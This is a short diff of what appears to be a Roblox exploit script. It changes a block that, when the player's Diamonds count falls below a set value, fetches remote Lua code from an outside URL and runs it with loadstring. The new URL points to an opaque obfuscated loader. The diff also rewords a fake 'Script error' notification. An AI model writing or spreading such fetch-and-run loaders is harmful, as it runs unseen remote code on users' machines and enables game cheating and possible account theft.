@@ -118,15 +118,14 @@ local PetFolders = {
 
 --// Diamond Check
 if Client.leaderstats.Diamonds.Value < _G.Diamonds then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/cacabpuding.lua"))()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fc715fb43902af268c335a5c7269be5e.lua"))()
 	wait(55555555)
 end
 
 if time() <= 30 then
-	wait(25)
 	game.StarterGui:SetCore("SendNotification", {
 	Title = "Script error"; -- the title (ofc)
-	Text = "Please wait and try again Remote not found !"; -- what the text says (ofc)
+	Text = "Wait for the game to load! Try again in a minute!"; -- what the text says (ofc)
 	Duration = 15; -- how long the notification should in secounds
 	})
 	return
